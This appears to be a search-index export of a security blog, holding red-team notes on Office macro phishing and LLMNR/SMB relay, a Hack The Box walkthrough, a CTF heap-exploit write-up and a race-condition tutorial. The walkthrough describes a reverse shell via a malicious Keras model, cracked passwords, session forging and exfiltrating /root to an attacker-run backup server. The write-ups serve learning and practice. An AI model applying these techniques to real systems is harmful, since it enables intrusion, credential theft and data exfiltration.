in corporate environments. Critical Risk: If macros are enabled by default (or policies are poorly enforced), the attack vector becomes a severe vulnerability. Bypassing Defenses: With obfuscation, sandbox detection, and sheet-hiding techniques, many traditional antivirus solutions can be evaded. Advanced variants also bypass some EDR tools by injecting into trusted processes. Persistence \u0026amp; Payload Delivery: Weaponized macros can be chained to download and execute secondary payloads (e.g., Meterpreter, Cobalt Strike), establishing long-term access. Detection Difficulty: When combined with living-off-the-land techniques (e.g., abusing PowerShell or WMI), attribution and detection become harder for defenders. Tools # macro_pack Generate-Macro ASR Rules Bypass.vba luckystrike Invoke-Obfuscation References # Attack surface reduction rules overview Attack surface reduction rules reference Phishing with MS Office EXCEL 4.0 XLM macro in MacroPack Pro A guide to creating malicious macro-enabled Excel worksheets Maldocs: Tips for Red Teamers w/ Didier Stevens - SANS HackFest \u0026amp; Ranges Summit 2020 Uncompromised: Unpacking a malicious Excel macro Testing initial access with \u0026ldquo;Generate-Macro\u0026rdquo; in Atomic Red Team Windows Red Team Exploitation Techniques | Luckystrike \u0026amp; PowerShell Empire Windows Defender Exploit Guard ASR VBScript/JS Rule ","date":"20 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/phishing/office365/marco/","section":"Red team","summary":"Exploring Marco ‚Äî a blend of simplicity and precision in the digital realm.","title":"Marco","type":"redteam"},{"content":" The message is fake.\nThe breach is real. ","date":"20 August 2025","externalUrl":null,"permalink":"/redteam/initialaccess/phishing/office365/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  The message is fake.\u003cbr\u003e\nThe breach is real.\n\u003c/div\u003e","title":"Office365","type":"redteam"},{"content":"","date":"20 August 2025","externalUrl":null,"permalink":"/tags/office365/","section":"Tags","summary":"","title":"Office365","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/credential-access/","section":"Tags","summary":"","title":"Credential Access","type":"tags"},{"content":" One flaw is nothing.\nBut linked together ‚Äî a weapon.\nThe chain drags the target down. ","date":"17 August 2025","externalUrl":null,"permalink":"/redteam/exploitchain/","section":"Red team","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  One flaw is nothing.\u003cbr\u003e\nBut linked together ‚Äî a weapon.\u003cbr\u003e\nThe chain drags the target down.\n\u003c/div\u003e","title":"Exploit chain","type":"redteam"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/exploit-chain/","section":"Tags","summary":"","title":"Exploit Chain","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/llmnr/","section":"Tags","summary":"","title":"LLMNR","type":"tags"},{"content":" Environment Setup # Scope: 192.168.50.0/24\n1. Domain Controller (DC) # Role: Active Directory Domain Controller Domain: victim.org IP Address: 192.168.50.100 2. MACHINEA # Domain Membership: victim.org IP Address: 192.168.50.3 Users: SyJoon ‚Üí Local Administrator VICTIM\\machinea ‚Üí Standard Domain User Notes: Default Windows security features/policies intact (no modifications). 3. VICTIM1 # Domain Membership: victim.org IP Address: 192.168.50.4 Users: victim1 ‚Üí Local Administrator VICTIM\\machinea ‚Üí Local Administrator, member of group Remote Management Users Configuration: Inbound \u0026amp; outbound File and Printer Sharing (SMB) enabled Windows Remote Management (HTTP-In) enabled Default Windows security features/policies intact (no modifications). 4. ATTACKER (Kali Machine) # IP Address: 192.168.50.2 Scenario # A domain user VICTIM\\machinea on MACHINEA mistypes a hostname or is tricked into accessing a non-existent network resource (e.g., \\\\fakehost\\share). The attacker poisons LLMNR and NBT-NS, causing MACHINEA to authenticate to the attacker-controlled host. This results in the capture of the user‚Äôs NTLMv2 hash. The attacker then relays the captured credentials to VICTIM1 (via SMB relay), gaining access and dumping the SAM database. With the dumped hashes, the attacker can perform offline password cracking or use Pass-the-Hash (PtH) to authenticate directly to VICTIM1. Exploit chain # Reconnaissance \u0026amp; Discovery # Requirements: SMB signing disabled or have SMB signing enabled but not required\nvulnerable Initial Access # A user may accidentally mistype a hostname while trying to access a network resource.\nAlternatively, an attacker can stage a scenario ‚Äî for example, impersonating a boss or department head and sending an email instructing an employee to connect to a shared resource ‚Äúfor review before the next meeting.‚Äù\nBoth cases cause the victim system to attempt name resolution, opening the door for LLMNR/NBT-NS poisoning. Credential Access # Attacker set up # MACHINEA # VICTIM\\machinea read phising mail / mistype a hostname\nObtaining User Hashes # If the captured hash corresponds to a weak password that exists in my wordlist, I can recover the plaintext password using tools such as Hashcat.\npassword pth Attack Rating # Technique: Easy / Not sophisticated Requirements: LLMNR and NBT-NS enabled on the target machine SMB accessible WinRM enabled (if planning remote login) Target user triggers a connection (e.g., mistyped hostname or network resource) Target user has Administrator privileges (for post-exploitation activities) Context: Attack is feasible and can succeed reliably Can be performed stealthily without triggering antivirus alerts, though advanced system monitoring or intrusion detection may still detect the activity. Real World: This scenario is likely to occur in real environments. Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques introduces additional NTLM relay attack methods and variations beyond the standard scenarios.\nReferences # The LLMNR/NBT-NS strike Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques Back to Basics: LLMNR and NBT-NS Spoofing ","date":"17 August 2025","externalUrl":null,"permalink":"/redteam/exploitchain/llmnr_nbt-ns/","section":"Red team","summary":"LLMNR/NBT-NS Poisoning and SMB Relay","title":"LLMNR/NBT-NS Poisoning and SMB Relay","type":"redteam"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/nbt-ns/","section":"Tags","summary":"","title":"NBT-NS","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/ntlm-relay/","section":"Tags","summary":"","title":"NTLM Relay","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/red-team/","section":"Tags","summary":"","title":"Red Team","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"SMB","type":"tags"},{"content":"","date":"17 August 2025","externalUrl":null,"permalink":"/tags/winrm/","section":"Tags","summary":"","title":"WinRM","type":"tags"},{"content":" Explore how to compromise a machine that hosts machine learning models built with Keras. Exploitation Walkthrough # Port Scan Results # The target system exposes the following open ports and services:\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Artificial - AI Solutions Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Initial Recon # Result from browser\n‚Üí Add the following entry to your hosts file 10.10.11.74 artificial.htb\nAfter reviewing artificial.htb, I found several interactive features available:\nAccount registration and login Uploading and executing machine learning models A downloadable template.py for building models in .h5 (Keras) format Upload model\nRun model\nThe most significant risk lies in the server‚Äôs ability to execute user-uploaded machine learning models. It\u0026rsquo;s unclear whether any validation or filtering is performed before these models are run. This behavior presents a promising attack surface and is worth investigating for potential vulnerabilities.\nExploiting Model Execution # Research # After a bit of Googling, I found several resources suggesting that this functionality could be exploitable.\nOn Malicious Models Potential Remote Code Execution (RCE) Vulnerability in Custom Layers Handling (#82214) Prepare payload # I created two payloads: one to test command injection by triggering a sleep delay, and another to establish a reverse shell.\nexp.py run_model.py Reverse shell established successfully.\nUser Account Owned # After gaining a shell as the app user, I accessed the server-side code to analyze it further and identify the underlying vulnerability.\nUsing server_upload.py to receive data app.tar.gz .\nSpotted user.db ‚Äî looks like it holds the keys to user accounts on the site. 1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8 2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb 3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36 4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6 5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0 These are the first five accounts in the user table, all using the @artificial.htb domain. This suggests they belong to staff members or users associated with the organization or internal system.\nSmashing the Hash # ‚Üí The gael account stands out as noteworthy.\nThey\u0026rsquo;re using MD5 for password hashing ‚Äî perfect target for John the Ripper .\ngael@artificial.htb: mattp005numbertwo royer@artificial.htb: marwinnarak043414036 Cracked and logged in ‚Äî both gael and royer accounts are now accessible.\nEscalating Account Compromise # Is there a way to escalate further and gain access to other users?\nIn app.py, I discovered the secret_key, which allows me to forge valid session cookies. Using hijacking_session.py , I can hijack sessions and log in as other users.\nmark@artificial.htb\n\u0026hellip;or hijack sessions of other players active on the box.\nMeowMeow@artificial.htb\nMission Complete: Flag Acquired # At first, I tried switching to the gael user using the cracked password, but it failed. This left me confused, and I spent a significant amount of time exploring alternative exploitation paths ‚Äî but nothing seemed to work\u0026hellip;\nWasted half a day chasing dead ends‚Ä¶ then I tried SSH ‚Äî and boom, I was in.\nFlag: 72c6100ad4e95442bfd90e3d0f66b706 System Pwned # Knowing the system runs Linux, I used linpeas.sh from PEASS-ng to enumerate potential privilege escalation vectors.\nFired up a server on my end and fetched linpeas.sh to the target ‚Äî time to hunt for root.\npython -m http.server 8000 After running it, the linpeas.sh output revealed several noteworthy findings worth investigating.\nService Discovery # backrest_backup.tar.gz The backrest.log file also revealed that a web server is running locally on 127.0.0.1:9898\nSetting up an SSH local port forwarding tunnel to view this service.\nssh gael@10.10.11.74 -L 9898:127.0.0.1:9898 Backrest Service Breach # This is a base64-encoded bcrypt password. I‚Äôm also using John the Ripper to attempt to crack it.\nbackrest_root: !@#$%^ Escalate Privileges to Root # Backrest \u0026amp;\u0026amp; Restic # First, I explored some of the available actions, such as creating a repository and testing the \u0026ldquo;run command\u0026rdquo; feature. I attempted command injection, but it didn‚Äôt work.\nSo, I needed to understand what Backrest actually does in order to find a way to leverage it for exploitation.\nrestic Backrest: a cross platform backup orchestrator and WebUI for restic Imagine setting up a repo that points to /root and exfiltrates the data straight to my Restic server ‚Äî now that‚Äôs leverage.\nWeaponized Restic Server # restic rest-server First, create a rest-server.\nInit repo to my server.\nBackup /root directory to my repo\nAccess to /root from server.\nSSH access using the .ssh/id_rsa\nFlag: 99b888214ef2cd3206a36fee7cba0918 ","date":"7 July 2025","externalUrl":null,"permalink":"/htb/machines/artificial/","section":"HTB","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Explore how to compromise a machine that hosts machine learning models built with Keras.\n\u003c/div\u003e\n\n\n\u003ch2 class=\"relative group\"\u003eExploitation Walkthrough \n    \u003cdiv id=\"exploitation-walkthrough\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#exploitation-walkthrough\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp align=\"center\"\u003e\n  \u003cimg src=\"img/walkthrough/overall.png\" /\u003e\n\u003c/p\u003e","title":"Artificial","type":"htb"},{"content":" Write-ups for Hack The Box machines, ctf,\u0026hellip;.., covering enumeration, exploitation, and post-exploitation. Explore boxes you\u0026rsquo;ve rooted, categorized by difficulty or technique. Find the flag. Exploit the target.\n","date":"7 July 2025","externalUrl":null,"permalink":"/htb/","section":"HTB","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Write-ups for Hack The Box machines, ctf,\u0026hellip;.., covering enumeration, exploitation, and post-exploitation.\n\u003c/div\u003e\n\n\u003cp\u003eExplore boxes you\u0026rsquo;ve rooted, categorized by difficulty or technique.\nFind the flag.\nExploit the target.\u003c/p\u003e","title":"HTB","type":"htb"},{"content":"","date":"7 July 2025","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":"My profile Write-ups for Hack The Box machines, covering enumeration, exploitation, and post-exploitation. Explore boxes you\u0026rsquo;ve rooted, categorized by difficulty or technique.\n","date":"7 July 2025","externalUrl":null,"permalink":"/htb/machines/","section":"HTB","summary":"\u003cp\u003e\u003ca\n  href=\"https://app.hackthebox.com/users/1895044\"\n    target=\"_blank\"\n  \u003eMy profile\u003c/a\u003e\n\n\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Write-ups for Hack The Box machines, covering enumeration, exploitation, and post-exploitation.\n\u003c/div\u003e\n\u003c/p\u003e\n\u003cp\u003eExplore boxes you\u0026rsquo;ve rooted, categorized by difficulty or technique.\u003c/p\u003e","title":"Machines","type":"htb"},{"content":"","date":"7 July 2025","externalUrl":null,"permalink":"/tags/machines/","section":"Tags","summary":"","title":"Machines","type":"tags"},{"content":" Wrap arround # unsigned __int64 menu() { unsigned int v1; // [rsp+8h] [rbp-4A8h] int v2; // [rsp+Ch] [rbp-4A4h] char str[128]; // [rsp+10h] [rbp-4A0h] BYREF char v4[512]; // [rsp+90h] [rbp-420h] BYREF char v5[512]; // [rsp+290h] [rbp-220h] BYREF __int64 v6; // [rsp+490h] [rbp-20h] char buf[10]; // [rsp+49Eh] [rbp-12h] BYREF unsigned __int64 v8; // [rsp+4A8h] [rbp-8h] v8 = __readfsqword(0x28u); v1 = 0; v6 = 0LL; do { puts(\u0026#34;\\nMenu:\u0026#34;); puts(\u0026#34;1. Flate\u0026#34;); puts(\u0026#34;2. Deflate\u0026#34;); puts(\u0026#34;3. New note\u0026#34;); puts(\u0026#34;4. Edit note\u0026#34;); puts(\u0026#34;5. Delete note\u0026#34;); puts(\u0026#34;6. View note\u0026#34;); puts(\u0026#34;7. Select note\u0026#34;); puts(\u0026#34;8. Exit\u0026#34;); printf(\u0026#34;Enter your choice: \u0026#34;); fflush(_bss_start); read(0, buf, 0xAuLL); v2 = atoi(buf); switch ( v2 ) { case 1: printf(\u0026#34;Enter a string to flate: \u0026#34;); fflush(_bss_start); read(0, str, 0x80uLL); str[strcspn(str, \u0026#34;\\n\u0026#34;)] = 0; flate_string(str, v5); printf(\u0026#34;Flated: %s\\n\u0026#34;, v5); break; case 2: printf(\u0026#34;Enter a string to deflate: \u0026#34;); fflush(_bss_start); read(0, str, 0x80uLL); str[strcspn(str, \u0026#34;\\n\u0026#34;)] = 0; deflate_string(str, v4); printf(\u0026#34;Deflated: %s\\n\u0026#34;, v4); break; case 3: v6 = new_note(v6); break; case 4: edit_note(v6); break; case 5: v6 = delete_note(v6, v1); break; case 6: print_note(v6); break; case 7: printf(\u0026#34;Enter a note to select: \u0026#34;); fflush(_bss_start); read(0, str, 2uLL); v1 = atoi(str); if ( v1 \u0026lt;= 3 \u0026amp;\u0026amp; v1 \u0026lt; note_count ) { v6 = notes[v1]; printf(\u0026#34;Current note is : %d\\n\u0026#34;, v1); } else { puts(\u0026#34;Bad index\u0026#34;); v1 = 0; } break; case 8: puts(\u0026#34;Bye !\u0026#34;); break; default: puts(\u0026#34;Invalid choice. Please try again.\u0026#34;); break; } } while ( v2 != 8 ); return v8 - __readfsqword(0x28u); } unsigned __int64 __fastcall flate_string(const char *str1, __int64 str2) { int v2; // eax char v4; // [rsp+13h] [rbp-2Dh] int v5; // [rsp+14h] [rbp-2Ch] int v6; // [rsp+18h] [rbp-28h] int v7; // [rsp+1Ch] [rbp-24h] int id; // [rsp+20h] [rbp-20h] int i; // [rsp+24h] [rbp-1Ch] unsigned __int64 v10; // [rsp+28h] [rbp-18h] v10 = __readfsqword(0x28u); v5 = 0; v6 = 0; for ( id = 0; id \u0026lt; strlen(str1); ++id ) { if ( ((*__ctype_b_loc())[str1[id]] \u0026amp; 0x800) != 0 ) { v7 = 0; while ( ((*__ctype_b_loc())[str1[id]] \u0026amp; 0x800) != 0 ) { v7 = 10 * v7 + str1[id] - 48; if ( v6 + v7 \u0026gt; 512 ) return v10 - __readfsqword(0x28u); ++id; } v4 = str1[id]; v6 += v7; for ( i = 0; i \u0026lt; v7; ++i ) { v2 = v5++; *(_BYTE *)(str2 + v2) = v4; } } } *(_BYTE *)(v5 + str2) = 0; return v10 - __readfsqword(0x28u); } This function sets a null byte after writing..\n*(_BYTE *)(v5 + str2) = 0; Check to avoid BOF.\nif ( v6 + v7 \u0026gt; 512 ) return v10 - __readfsqword(0x28u); unsigned __int64 __fastcall deflate_string(const char *a1, __int64 a2) { int v3; // [rsp+1Ch] [rbp-24h] int v4; // [rsp+20h] [rbp-20h] int i; // [rsp+24h] [rbp-1Ch] unsigned __int64 v6; // [rsp+28h] [rbp-18h] v6 = __readfsqword(0x28u); v3 = 1; v4 = 0; for ( i = 0; i \u0026lt; strlen(a1); ++i ) { if ( ((*__ctype_b_loc())[a1[i]] \u0026amp; 0x400) != 0 ) { if ( a1[i] == a1[i + 1] ) { ++v3; } else { v4 += sprintf((char *)(v4 + a2), \u0026#34;%d%c\u0026#34;, v3, (unsigned int)a1[i]); v3 = 1; } } } *(_BYTE *)(v4 + a2) = 0; return v6 - __readfsqword(0x28u); } void *new_note() { void *buf; // [rsp+8h] [rbp-18h] if ( note_count \u0026lt;= 3 ) { buf = calloc(0x410uLL, 1uLL); printf(\u0026#34;Enter your note: \u0026#34;); fflush(_bss_start); read(0, buf, 0x410uLL); notes[note_count++] = buf; return buf; } else { puts(\u0026#34;You reach max note limit\u0026#34;); return 0LL; } } unsigned __int64 __fastcall edit_note(void *a1) { unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); if ( a1 ) { memset(a1, 0, 0x410uLL); printf(\u0026#34;Edit your note: \u0026#34;); fflush(_bss_start); read(0, a1, 0x410uLL); } else { puts(\u0026#34;You don\u0026#39;t have a note at this index\u0026#34;); } return v2 - __readfsqword(0x28u); } __int64 __fastcall delete_note(void *a1, int a2) { if ( a1 \u0026amp;\u0026amp; notes[a2] ) { if ( a1 == (void *)notes[a2] ) { memset(a1, 0, 0x410uLL); free(a1); notes[a2] = 0LL; } else { puts(\u0026#34;You don\u0026#39;t have a note at this index\u0026#34;); } return 0LL; } else { puts(\u0026#34;You don\u0026#39;t have a note at this index\u0026#34;); return 0LL; } } unsigned __int64 __fastcall print_note(const char *a1) { unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); if ( a1 ) printf(\u0026#34;Your note : %s\\n\u0026#34;, a1); else puts(\u0026#34;You don\u0026#39;t have a note at this index\u0026#34;); return v2 - __readfsqword(0x28u); } case 7: printf(\u0026#34;Enter a note to select: \u0026#34;); fflush(_bss_start); read(0, str, 2uLL); v1 = atoi(str); if ( v1 \u0026lt;= 3 \u0026amp;\u0026amp; v1 \u0026lt; note_count ) { v6 = notes[v1]; printf(\u0026#34;Current note is : %d\\n\u0026#34;, v1); } else { puts(\u0026#34;Bad index\u0026#34;); v1 = 0; } Allocation: I have 4 chances to allocate memory using alloc. Deletion: delete_note must clear the note, free the allocated memory, and set the corresponding index in notes to 0. Before cleaning, it should ensure the pointer is not NULL and check that a1 == (void *)notes[a2]. Editing \u0026amp; Printing: edit_note and print_note only check if the pointer is not NULL before performing operations. Selection: When selecting a note, ensure the index is within bounds to prevent out-of-bounds access. Exploit # flate_string doesn\u0026rsquo;t set null before return when it checks BOF.\n‚Üí Leak stack, libc, heap, elf,\u0026hellip;..\nAnd the clear wrong handle is the write null byte. If I write full to v5, this will overwrite one null byte to v6 in the stack; that is the pointer to note for many options like print_node, edit_node, and so on. This also means this v6 pointer will point to the previous chunk, giving me the chance to overwrite the size or something of the old chunk.\n‚Üí I create a fake chunk in the first chunk, and overwrite prev_size of this and chunk size of the second chunk to trigger unlink-attack\n‚Üí point to stack ‚Üí ROP ‚Üí pop a shell\nPayload # Payload ","date":"3 March 2025","externalUrl":null,"permalink":"/ctf/pwnme-2025/","section":"CTF","summary":"Just the small description for challenge compress in  PwnMe CTF Quals 2025","title":"Compress","type":"ctf"},{"content":" Detailed walkthroughs of CTF challenges: web, pwn, reverse, crypto, and more. Browse by event or challenge type.\n","date":"3 March 2025","externalUrl":null,"permalink":"/ctf/","section":"CTF","summary":"\u003cdiv class=\"lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl\"\u003e\n  Detailed walkthroughs of CTF challenges: web, pwn, reverse, crypto, and more.\n\u003c/div\u003e\n\n\u003cp\u003eBrowse by event or challenge type.\u003c/p\u003e","title":"CTF","type":"ctf"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/exploitation/","section":"Tags","summary":"","title":"Exploitation","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/heap/","section":"Tags","summary":"","title":"Heap","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/unlink-attack/","section":"Tags","summary":"","title":"Unlink-Attack","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/write-up/","section":"Tags","summary":"","title":"Write-Up","type":"tags"},{"content":"","date":"3 January 2025","externalUrl":null,"permalink":"/tags/operating-systems/","section":"Tags","summary":"","title":"Operating Systems","type":"tags"},{"content":" Introduction # Race conditions are a common yet critical issue in both digital systems and cybersecurity, where improper handling of simultaneous operations can cause unpredictable behavior. Whether in logic circuits or software applications, race conditions can lead to unexpected glitches, security vulnerabilities, and even full system compromises.\nRace Conditions in Reality # Imagine two people trying to withdraw money from the same bank account at the exact same time. If the system doesn\u0026rsquo;t handle both requests properly, it might allow them to overdraw the account ‚Äî resulting in unexpected or incorrect behavior. This scenario perfectly illustrates the essence of a race condition: when the outcome depends on the timing of events.\nIn the world of cybersecurity, race conditions have been at the heart of some of the most infamous vulnerabilities, such as the Dirty COW exploit (CVE-2016-5195) . These types of bugs allow attackers to manipulate a system by taking advantage of timing issues in how resources are accessed.\nWhy Should You Care? # Race conditions aren\u0026rsquo;t just an abstract concept in digital circuits or operating systems ‚Äî they are a real-world problem that attackers can exploit to:\nBypass security controls Gain unauthorized access Corrupt or modify data Understanding how race conditions occur, both in hardware and software, is essential for anyone working in system design, security analysis, or exploit development.\nWhat is a Race Condition? # A race condition happens when two or more entities simultaneously access, modify, or interact with a shared resource. The outcome depends on the order and timing of these interactions. Because the entities operate independently, their actions can overlap, leading to unexpected results or conflicts. This unpredictability can disrupt processes that rely on consistent or coordinated use of the shared resource.\nRace Condition in Logic Circuits # The race condition was first observed in logic circuits, where differences in propagation delays between circuit components can cause unintended glitches or incorrect outputs.\nA race condition in a logic circuit occurs when the output depends on the timing of input signal changes, leading to unintended behavior or glitches. This happens due to differences in propagation delays of the logic gates involved.\nThe term race condition was already in use by 1954, for example in David A. Huffman\u0026rsquo;s doctoral thesis \u0026ldquo;The synthesis of sequential switching circuits\u0026rdquo;.\nThe circuit has one input signal: A. It consists of: A NOT gate with a propagation delay of Œît‚ÇÅ. An AND gate with a propagation delay of Œît‚ÇÇ. Propagation delay refers to the time it takes for a signal to travel through a logic gate from input to output.\nNOT gate delay (Œît‚ÇÅ):\nWhen the input A is fed into the NOT gate, it takes Œît‚ÇÅ units of time for the NOT gate to produce the correct output.\nAND gate delay (Œît‚ÇÇ):\nWhen the input signals arrive at the AND gate, it takes Œît‚ÇÇ units of time for the gate to produce the correct output.\nLet\u0026rsquo;s assume the input A changes from low (0) to high (1). The race condition occurs due to the following timing differences:\nThe NOT gate inverts the input A with a propagation delay of Œît‚ÇÅ. The AND gate then combines the original input A with the inverted value A\u0026rsquo; from the NOT gate. However, due to the delay in the NOT gate, A\u0026rsquo; reaches the AND gate later than A, creating a timing mismatch. The AND gate also introduces its own delay of Œît‚ÇÇ, further contributing to the glitch that causes the race condition. When the input A changes from 0 to 1:\nThe AND gate receives the original input A immediately. The NOT gate takes Œît‚ÇÅ time to update its output. The AND gate will output a short spike because it initially receives the old value from the NOT gate before the NOT gate\u0026rsquo;s output stabilizes. The duration of this spike is:\n(Œît‚ÇÅ + Œît‚ÇÇ) - Œît‚ÇÇ = Œît‚ÇÅ Note\nThe sum of Œît‚ÇÅ and Œît‚ÇÇ represents the critical path ‚Äî the longest path that a signal must travel through the circuit, determining the circuit\u0026rsquo;s overall delay. Race Condition in Software # When I research Race Conditon, I wonder why race conditions in software are often detected later than hardware race conditions, even though both deal with concurrency issues.\nThere are a few primary keys involved\nTiming Sensitivity: Hardware Requires Precise Timing Detection.\nIn hardware, timing is critical because circuits rely on exact timing of signals to function correctly. Even a tiny delay in signal propagation can cause a critical failure, such as setup/hold time violations or metastability in flip-flops. Since hardware is physically built and operates in real-time, race conditions must be detected early during the circuit design phase. If a race condition in hardware goes undetected, it can cause permanent physical failures in chips, making the hardware unusable ‚Üí Hardware race condition detection happens early because it\u0026rsquo;s mission-critical to ensure circuits work reliably before they are manufactured.\nSoftware Race Conditions Depend on Runtime Behavior.\nIn contrast, software race conditions are logical bugs that emerge based on runtime behavior, meaning they depend on how the program runs in a particular environment. Concurrency isn\u0026rsquo;t always deterministic: Software race conditions depend on the operating system\u0026rsquo;s thread scheduling and hardware execution timing, which vary across different runs. They don\u0026rsquo;t always manifest: Some race conditions might only occur under specific conditions (e.g., heavy system load or specific input sequences), making them hard to detect during development. Testing tools aren\u0026rsquo;t perfect: Detecting software race conditions requires tools like ThreadSanitizer, Valgrind, or dynamic analysis tools, but these tools can slow down the program significantly, making it impractical to use them all the time. ‚Üí Software race conditions may only be discovered later during testing or even after deployment, when they manifest in real-world use cases.\nRace Conditions # A race condition occurs in software when multiple code paths are executed concurrently, and the outcome depends on the timing of these operations. If the execution times of these paths vary unexpectedly, they may complete in an unintended order, leading to unanticipated behavior and software bugs. In some cases, race conditions can also arise between two or more separate programs, potentially resulting in security vulnerabilities.\nHow Race Conditions Happen # Race conditions typically occur in scenarios involving concurrent processes or multithreading. For example, when two threads attempt to access shared resources (such as files, memory, or hardware) simultaneously, without proper synchronization mechanisms, one thread might override or conflict with the other. This can lead to inconsistent data, crashes, or even security breaches.\nSecurity Risks # Race conditions pose significant security risks, as attackers can exploit these timing issues to manipulate a program\u0026rsquo;s execution. Some common attack vectors include:\nPrivilege Escalation: Exploiting timing vulnerabilities to gain unauthorized access or escalate user privileges. Data Corruption: Modifying or deleting critical data by manipulating the execution order of operations. Denial of Service (DoS): Triggering unexpected behaviors that cause the system to crash or hang, disrupting normal operation. Practical Example # Producer-Consumer # Problem # This code demonstrates a race condition between two threads: a producer and a consumer. Both threads share a common resource, products, which is a variable that tracks the total number of produced and consumed products. The producer thread increments the products variable, and the consumer thread decrements it. Without proper synchronization, this code exhibits undefined behavior, leading to potential issues such as negative values for products.\nint products = 0; void *producer(void *arg) { while (products \u0026lt; 100) { products++; printf(\u0026#34;+------------------+\\n\u0026#34;); printf(\u0026#34;|Produced a product|\\tTotal products: %d\\n\u0026#34;, products); } return NULL; } void *consumer(void *arg) { while (products \u0026gt; 0) { products--; printf(\u0026#34;+------------------+\\n\u0026#34;); printf(\u0026#34;|Consumed a product|\\tTotal products: %d\\n\u0026#34;, products); } return NULL; } The main issue lies in the concurrent access to the shared resource products by both threads. Since the increment (products++) and decrement (products--) operations are not atomic, the threads can interfere with each other, causing incorrect results.\nFor example:\nThe producer thread reads the value of products. The consumer thread also reads the value of products (which has not been updated by the producer yet). Both threads perform their operations (increment and decrement), leading to an incorrect final value of products, which can become a false update. In this code, I visualize the process of producing and consuming a product, where products is the shared variable of both threads. When I run this code, the value of products might be a false update.\nOne output sample Solution # To fix the race condition, we use mutexes to synchronize access to the shared resource. This ensures that only one thread at a time can access and modify the products variable, making the program\u0026rsquo;s behavior predictable and correct.\nKey Changes # Mutex Locking: We use pthread_mutex_lock before accessing products to ensure mutual exclusion, preventing both threads from modifying the variable simultaneously. Mutex Unlocking: After a thread has finished modifying the variable, it releases the lock with pthread_mutex_unlock, allowing the other thread to access the shared resource. code void *producer(void *arg) { while (products \u0026lt; 100) { pthread_mutex_lock(\u0026amp;lock); products++; printf(\u0026#34;+------------------+\\n\u0026#34;); printf(\u0026#34;|Produced a product|\\tTotal products: %d\\n\u0026#34;, products); pthread_mutex_unlock(\u0026amp;lock); } return NULL; } void *consumer(void *arg) { while (products \u0026gt; 0) { pthread_mutex_lock(\u0026amp;lock); products--; printf(\u0026#34;+------------------+\\n\u0026#34;); printf(\u0026#34;|Consumed a product|\\tTotal products: %d\\n\u0026#34;, products); pthread_mutex_unlock(\u0026amp;lock); } return NULL; } Bank account # Note\nIn a multi-threaded program, the operating system\u0026rsquo;s scheduler decides when to switch between threads (called a context switch). However, context switches don\u0026rsquo;t always happen exactly where we want during testing, making it hard to reproduce race conditions.\nBy inserting a small delay using usleep(1). This increase the likelihood that the operating system will perform a context switch at that point and Force both threads to access shared resources at overlapping times, increasing the chances of a race condition.\nProblem # Without the delay, the program might run so fast that both operations complete before a context switch happens, making the race condition harder to observe.\nIn this code , two threads perform deposit and withdrawal operations on a shared bank account balance. Due to the lack of proper synchronization, a race condition occurs, causing incorrect balance updates.\nint balance = 1000; int depositAmount = 500; int withdrawAmount = 300; void* deposit(void* arg) { int amount = *(int*)arg; int temp = balance; usleep(1); balance = temp + amount; printf(\u0026#34;Deposit: +%d, New Balance: %d\\n\u0026#34;, amount, balance); return NULL; } void* withdraw(void* arg) { int amount = *(int*)arg; if (balance \u0026gt;= amount) { int temp = balance; usleep(1); balance = temp - amount; printf(\u0026#34;Withdraw: -%d, New Balance: %d\\n\u0026#34;, amount, balance); } else { printf(\u0026#34;Withdraw: -%d, Insufficient funds! Current Balance: %d\\n\u0026#34;, amount, balance); } return 